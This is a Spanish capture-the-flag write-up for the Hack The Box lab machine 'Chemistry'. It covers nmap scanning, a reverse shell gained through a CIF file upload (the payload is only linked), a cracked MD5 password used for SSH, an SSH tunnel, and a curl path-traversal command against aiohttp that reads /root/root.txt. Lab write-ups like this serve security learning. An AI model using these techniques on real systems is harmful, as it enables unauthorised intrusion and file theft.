**Conectarse a la VPN de HTB**  
`sudo openvpn --config Desktop/lab_a21josperjim.ovpn`  

![VPN config](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241122153549.png)  

**Escaneo de puertos abiertos**  
`nmap -sT -Pn 10.10.11.38`

![Nmap scan](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241122153515.png)  

**Sacar información de los puertos abiertos**  
`nmap -sT -sV -vvv -p 22,5000 -Pn 10.10.11.38` *(solo puertos abiertos)*

![Nmap detailed scan](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241122153619.png)  

**Probamos la IP con el puerto 5000 en el navegador**

![Web page](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241122160118.png)  

Nos permite registrarnos. Tras acceder, hay un dashboard:

![Dashboard](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241122164202.png)  
*Permite subir archivos CIF (Crystallographic Information File).*  

**Explotación de vulnerabilidad en archivos CIF**  
Buscando información, encontramos que estos archivos pueden permitir una *reverse shell*. El archivo a subir es: [Chemistry HTB RS](#).  

**Reverse Shell obtenida**

![Reverse shell](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125160908.png)  

**Exploración de directorios**  
Usamos `ls | grep -P '^[\w\s\.\-\(\)]+$'` para filtrar nombres legibles: 

![Directories](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125161252.png)  

**Base de datos en `/instance`**  
Encontramos hashes de contraseñas:  

![Database](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125161513.png) 

![Hashes](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125161712.png)  

**Descifrado de hash (MD5)**  
Usando herramientas como CrackStation, obtenemos la contraseña: `unicorniosrosados`.  

![Hash cracked](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125161933.png)  

**Acceso al usuario `rosa` y primera flag**  

![User access](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125162037.png) 

![First flag](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125162058.png)  

**Conexión por SSH**  

![SSH login](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241125162814.png)  

**Escaneo de vulnerabilidades con `linpeas.sh`** 

![LinPEAS scan](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127184141.png)  
*Se detectó una vulnerabilidad en la versión del sistema.*  

**Intento de explotación (sin éxito)**  

![Exploit attempt](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127184305.png)
![Exploit attempt](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127184402.png)
![Exploit attempt](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127184654.png)
![Exploit attempt](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127184828.png)

**Puerto 8080 accesible localmente**  

![Local port scan](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127185034.png)  

**Tunel inverso para inspeccionar el servicio**  
`ssh -L 2000:localhost:8080 rosa@10.10.11.38`  

![Tunnel setup](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127190008.png)  

**Vulnerabilidad de *Path Traversal* en `aiohtto/3.9.1`**  
Permite navegar por directorios con `../`:  

![Path traversal](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127191035.png)  

**Explotación con `curl`**  
Usamos:  
`curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt`
![root](https://github.com/jose75213/write-up/blob/main/Images/Pasted%20image%2020241127193354.png)  


